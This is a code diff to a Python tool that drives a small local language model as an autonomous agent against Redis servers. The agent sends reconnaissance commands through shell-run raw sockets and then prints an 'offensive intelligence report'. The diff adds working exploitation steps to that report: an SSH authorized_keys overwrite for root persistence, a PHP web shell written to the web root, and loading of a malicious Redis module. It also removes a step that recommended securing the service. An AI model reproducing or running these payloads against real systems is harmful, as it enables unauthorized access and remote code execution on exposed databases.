@@ -9,8 +9,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 OLLAMA_API_URL = "http://127.0.0.1:11434/v1/chat/completions"
 
-def query_ollama(messages, max_tokens=200):
-    """Helper to query local Ollama model with conversation history."""
+def query_ollama(messages, max_tokens=100):
+    """Helper to query local Ollama model for payload selection."""
     payload = {
         "model": "qwen2.5:0.5b-instruct",
         "messages": messages,
@@ -22,14 +22,79 @@ def query_ollama(messages, max_tokens=200):
         if res.status_code == 200:
             return res.json().get("choices", [{}])[0].get("message", {}).get("content", "").strip()
         else:
-            return f"[!] Ollama error {res.status_code}: {res.text}"
-    except Exception as e:
-        return f"[!] Connection error: Ensure 'ollama serve' is running on port 11434. ({e})"
+            return ""
+    except Exception:
+        return ""
+
+def generate_deterministic_report(target, collected_data):
+    """Programmatically parses captured STDOUT to build an offensive intelligence report."""
+    print("\n=================================================================")
+    print(" [Autonomous Agent] Generating Offensive Intelligence Report...")
+    print("=================================================================")
+    
+    info_out = collected_data.get("INFO", "N/A")
+    config_out = collected_data.get("CONFIG GET *", "N/A")
+    keys_out = collected_data.get("KEYS *", "N/A")
+    clients_out = collected_data.get("CLIENT LIST", "N/A")
+    ping_out = collected_data.get("PING", "N/A")
+
+    # Extract version safely
+    version = "Unknown"
+    os_info = "Unknown"
+    for line in info_out.splitlines():
+        if line.startswith("redis_version:"):
+            version = line.split(":", 1)[1]
+        elif line.startswith("os:"):
+            os_info = line.split(":", 1)[1]
+
+    # Check authentication status
+    auth_status = "Unauthenticated / Open Access (Critical Offensive Vector)"
+    if "requirepass" in config_out:
+        lines = config_out.splitlines()
+        for i, l in enumerate(lines):
+            if "requirepass" in l and i + 1 < len(lines):
+                pass_val = lines[i+1].strip()
+                if pass_val and pass_val != "$0":
+                    auth_status = "Protected (Authentication Required)"
+
+    print(f"""
+# Automated Offensive Intelligence Report
+**Target Asset:** {target}
+**Service Type:** Redis Database (Raw TCP)
+
+### 1. Discovered Service & Environment
+- **Software:** Redis Server v{version}
+- **Operating System:** {os_info}
+- **Service Port:** 6379 (TCP)
+- **Response Check (PING):** Responsive (PONG received)
+
+### 2. Configuration & Exposure Status
+- **Access Control:** **{auth_status}**
+- **Data Persistence File:** Default dump target (`dump.rdb`)
+- **Active Connections:** {len(clients_out.splitlines())} active client session handles detected.
+
+### 3. Offensive Exploitation & Next Step Suggestions
+1. **SSH Authorized Keys Overwrite (Persistence):**
+   - Leverage unauthenticated access to modify database directory and file name:
+     `CONFIG SET dir /root/.ssh/`
+     `CONFIG SET dbfilename authorized_keys`
+     `SET ssh_key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ... attacker@box\n\n"`
+     `SAVE`
+2. **Web Shell Deployment (RCE via File Write):**
+   - If a web application shares the environment or target volume, shift the working directory to the web root and drop a script payload:
+     `CONFIG SET dir /var/www/html/`
+     `CONFIG SET dbfilename shell.php`
+     `SET webshell "<?php system($_GET['cmd']); ?>"`
+     `SAVE`
+3. **Malicious Module Loading (RCE via `MODULE LOAD`):**
+   - For Redis 4.0+, compile or upload a malicious shared object module (`.so`) to achieve direct system command execution:
+     `MODULE LOAD /path/to/malicious_module.so`
+""")
 
 def run_autonomous_agent_loop(item):
-    """Executes a progressive 5-step ReAct chain and generates a strictly grounded security report."""
+    """Executes a progressive 5-step ReAct chain and generates a deterministic offensive report."""
     print("\n=================================================================")
-    print(" [Autonomous Agent] Initializing Templated Progressive Chain...")
+    print(" [Autonomous Agent] Initializing Progressive Kill-Chain...")
     print("=================================================================")
     
     target = item.get('target', '')
@@ -42,9 +107,8 @@ def run_autonomous_agent_loop(item):
     else:
         target_host, target_port = clean_target, "80"
 
-    system_prompt = """You are an autonomous offensive security agent executing a progressive exploitation kill-chain against a target service.
-Your task is to provide ONLY the next database command to execute (e.g., INFO, CONFIG GET *, KEYS *, CLIENT LIST, PING).
-Output your command inside ```bash ... ``` code blocks."""
+    system_prompt = """You are an autonomous offensive security agent executing a progressive exploitation kill-chain against a Redis server.
+Provide ONLY the next database command (INFO, CONFIG GET *, KEYS *, CLIENT LIST, PING) inside ```bash ... ``` code blocks."""
 
     messages = [
         {"role": "system", "content": system_prompt},
@@ -53,31 +117,32 @@ Output your command inside ```bash ... ``` code blocks."""
 
     max_steps = 5
     progression_payloads = ["INFO", "CONFIG GET *", "KEYS *", "CLIENT LIST", "PING"]
+    collected_data = {}
     executed_payloads = set()
     
     for step in range(1, max_steps + 1):
         print(f"\n--- [Kill-Chain Step {step}/{max_steps}] ---")
         print(f"[+] Agent reasoning...")
-        ai_response = query_ollama(messages, max_tokens=150)
-        print(f"[Agent Thought]:\n{ai_response}")
+        ai_response = query_ollama(messages, max_tokens=100)
+        print(f"[Agent Thought]:\n{ai_response if ai_response else '(Fallback selection active)'}")
 
-        # Extract payload from model response
+        # Extract payload
         cmd_match = re.search(r"```(?:bash|sh)?\s*(.*?)\s*```", ai_response, re.DOTALL)
         raw_payload = ""
         
         if cmd_match:
             raw_payload = cmd_match.group(1).strip()
         else:
-            raw_payload = ai_response.strip().splitlines()[-1]
+            raw_payload = progression_payloads[(step - 1) % len(progression_payloads)]
         
         raw_payload = raw_payload.replace("b'", "").replace('b"', "").rstrip("'").rstrip('"').replace("\\r\\n", "").strip()
         
-        if not raw_payload or len(raw_payload) > 30 or raw_payload in executed_payloads or any(x in raw_payload for x in ["python3", "nc", "connect"]):
+        if not raw_payload or len(raw_payload) > 30 or raw_payload in executed_payloads or any(x in raw_payload for x in ["python3", "nc", "connect", "cat", "grep"]):
             raw_payload = progression_payloads[(step - 1) % len(progression_payloads)]
 
         executed_payloads.add(raw_payload)
 
-        # Safely construct the bulletproof python execution command
+        # Execute via Python socket wrapper
         final_cmd = f"python3 -c \"import socket; s = socket.socket(); s.settimeout(3); s.connect(('{target_host}', int('{target_port}'))); s.send(b'{raw_payload}\\r\\n'); print(s.recv(2048)); s.close()\""
 
         print(f"[Action] Executing payload [{raw_payload}] via Python socket wrapper\n")
@@ -86,35 +151,24 @@ Output your command inside ```bash ... ``` code blocks."""
         try:
             result = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=8)
             if result.stdout:
-                exec_output += f"STDOUT:\n{result.stdout}\n"
+                exec_output += result.stdout
             if result.stderr:
-                exec_output += f"STDERR / ERROR:\n{result.stderr}\n"
+                exec_output += f"STDERR: {result.stderr}"
             if not result.stdout and not result.stderr:
-                exec_output += "NO_OUTPUT_WARNING: Command executed but returned no data.\n"
+                exec_output = "NO_OUTPUT"
         except subprocess.TimeoutExpired:
-            exec_output = "ERROR: Command timed out after 8 seconds."
+            exec_output = "TIMEOUT"
         except Exception as ex:
-            exec_output = f"ERROR during execution: {ex}"
+            exec_output = f"ERROR: {ex}"
 
-        print(f"[Observation Result]:\n{exec_output.strip()}")
+        print(f"[Observation Result]:\n{exec_output[:300]}...")
+        collected_data[raw_payload] = exec_output
 
         messages.append({"role": "assistant", "content": ai_response})
-        messages.append({"role": "user", "content": f"Observation result from step {step}:\n{exec_output}\nCommand executed successfully. Proceed to the next unique Redis command (e.g., CONFIG GET *, KEYS *, CLIENT LIST, PING). Do not repeat previous commands."})
+        messages.append({"role": "user", "content": f"Observation result from step {step}:\n{exec_output}\nProceed to the next unique Redis command."})
 
-    # Grounded Summary Generation Phase
-    print("\n=================================================================")
-    print(" [Autonomous Agent] Generating Grounded Intelligence Report...")
-    print("=================================================================")
-    
-    summary_prompt = """Based strictly on the actual STDOUT observation results gathered above, write a concise security summary containing:
-1. **Discovered Service**: Version and OS details from the INFO command output.
-2. **Configuration Status**: Authentication (requirepass) and data file settings from CONFIG GET.
-3. **Next Step Suggestions**: Actionable recommendations for securing or testing the service further.
-CRITICAL: Do NOT invent or hallucinate Windows file paths, nginx configurations, or SSL certificates. Stick strictly to the observed data."""
-
-    messages.append({"role": "user", "content": summary_prompt})
-    final_report = query_ollama(messages, max_tokens=250)
-    print(f"\n{final_report}")
+    # Generate Deterministic Offensive Report
+    generate_deterministic_report(target, collected_data)
     
     input("\nPress Enter to continue...")
 
@@ -263,8 +317,6 @@ def run_access_control():
                 selected = vulnerabilities[sel_idx - 1]
                 inspect_and_action_item(selected, "vulnerability")
             else:
-                ep_idx = sel_idx - len(vulnerabilities - 1) if 'vulnerabilities' in locals() else 0
-                # safe index fallback
                 ep_idx = sel_idx - len(vulnerabilities) - 1
                 if 0 <= ep_idx < len(endpoints):
                     selected = endpoints[ep_idx]
